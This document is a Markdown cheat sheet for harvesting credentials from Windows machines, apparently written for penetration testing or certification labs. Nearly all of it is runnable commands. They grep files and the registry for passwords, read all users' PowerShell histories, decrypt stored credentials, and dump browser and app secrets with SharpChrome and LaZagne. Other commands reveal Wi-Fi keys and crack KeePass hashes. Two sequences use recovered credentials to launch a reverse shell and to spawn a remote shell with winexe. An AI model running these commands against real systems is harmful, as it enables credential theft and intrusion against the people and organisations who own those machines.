# ✅ Windows Credential Hunting (Cheat Sheet)


- [ ] kdbx search
---

## 🎯 Quick Wins
- [ ] **Find Plaintext Credentials in Config Files** → *.config, *.xml, *.ini, *.txt
- [ ] **Check PowerShell History** → ConsoleHost_history.txt
- [ ] **Look for Unattend Files** → unattend.xml, sysprep.inf
- [ ] **Search Chrome Dictionary Files** → Custom Dictionary.txt
- [ ] **Grab Stored PowerShell Credentials** → Export-Clixml files
- [ ] **Inspect Sticky Notes DB** → plum.sqlite
- [ ] **Enumerate Saved Creds with cmdkey** → /list
- [ ] **Dump Browser Passwords** → SharpChrome
- [ ] **Run LaZagne for Multi-App Credential Dump**
- [ ] **Find KeePass DB Files** → *.kdbx
- [ ] **Enumerate AutoLogon in Registry**
- [ ] **Recover Wi-Fi Passwords** → netsh wlan show profile key=clear
- [ ] check for `c:\\programdata` , `C:\Users\All USers` , `C:\Program Files` for sensitive files , also check for hidden files and other directories

---

##  ✅ Hidden in Plain View

```c
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

```


## ✅ File & Config Searches

```c
.\winPEASany.exe quiet cmd searchfast filesinfo
```

```powershell
# Search for credentials in common config/text files
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

# Recursive search for "password"
findstr /si password *.*

# PowerShell alternative
Select-String -Path C:\Users\*\Documents\*.txt -Pattern "password"

# Search for common credential-related file names
dir /S /B *pass*.txt == *pass*.xml == *cred* == *vnc* == *.config*
where /R C:\ *.config

dir /s *pass* == *.config
findstr /si password *.xml *.ini *.txt
```
## ✅ IIS Config Files (Example)
```c
# Check IIS default web.config
C:\inetpub\wwwroot\web.config
```
## ✅ Chrome Dictionary Files
```c
# Look for saved passwords in Chrome's Custom Dictionary
gc 'C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String "password"
```
## ✅ Unattended Installation Files
```c
# Common location
C:\Windows\Panther\unattend.xml
# Look for <Password> tags in XML
```
## ✅ PowerShell History
```c
# Default location
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Enumerate all users' history
foreach($user in ((ls C:\users).fullname)){
  cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
}
```
## ✅ PowerShell Stored Credentials
```c
# Load and decrypt saved credentials
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().Username
$credential.GetNetworkCredential().Password
```
## ✅ Sticky Notes DB
```c
# Location
C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite

# Query notes for secrets
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note"
```
## ✅ Saved Credentials (cmdkey)

```c
# 1.Use winPEAS to check for saved credentials:
> .\winPEASany.exe quiet cmd windowscreds

# 2.It appears that saved credentials for the admin user exist.

# 3.We can verify this manually using the following command:
> cmdkey /list

# 4.If the saved credentials aren’t present, run the following script to refresh the credential:
> C:\PrivEsc\savecred.bat

# 5.We can use the saved credential to run any command as the admin user. Start a listener on Kali and run the reverse shell executable:
> runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

```c
cmdkey /list
# Example:
# Target: TERMSRV/SQL01
# User: inlanefreight\bob
```
## ✅ Run as Saved Credential
```c
runas /savecred /user:DOMAIN\username "COMMAND"
```
## ✅ Browser Credentials
```c
# Use SharpChrome to dump Chrome saved logins
SharpChrome.exe logins /unprotect
```
## ✅ KeePass Hash Extraction
```c
# Convert KeePass DB to hash
keepass2john.py file.kdbx > hash.txt

# Crack with hashcat
hashcat -m 13400 hash.txt rockyou.txt
```
## ✅ LaZagne – Multi-App Credential Dump
```c
lazagne.exe all
# Dumps creds from browsers, chat apps, RDP, WinSCP, etc.
```
## ✅ SessionGopher – Saved RDP/SSH Credentials
```c
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target localhost
```

## ✅ Searching the Registry for Passwords

```c
# The following commands will search the registry for keys and values that contain “password”
> reg query HKLM /f password /t REG_SZ /s
> reg query HKCU /f password /t REG_SZ /s
# This usually generates a lot of results, so often it is more fruitful to look in known locations
```

```c
# 1.Use winPEAS to check common password locations:
> .\winPEASany.exe quiet filesinfo userinfo
# (the final checks will take a long time to complete)

# 2.The results show both AutoLogon credentials and Putty session credentials for the admin user (admin/password123).

# 3.We can verify these manually:
> reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

# 4.On Kali, we can use the winexe command to spawn a shell using these credentials:

# winexe -U 'admin%password123' //192.168.1.22 cmd.exe
```

## ✅ Registry – Windows AutoLogon
```c
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
# Look for:
# AutoAdminLogon, DefaultUserName, DefaultPassword
```
## ✅ Registry – PuTTY Sessions
```c
reg query "HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>"
# Look for ProxyUsername, ProxyPassword
```
## ✅ Wi-Fi Passwords
```c
netsh wlan show profile
netsh wlan show profile <SSID> key=clear
```
## ✅ Interesting Files to Check
```c
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
C:\ProgramData\Configs\*
%USERPROFILE%\ntuser.dat
```
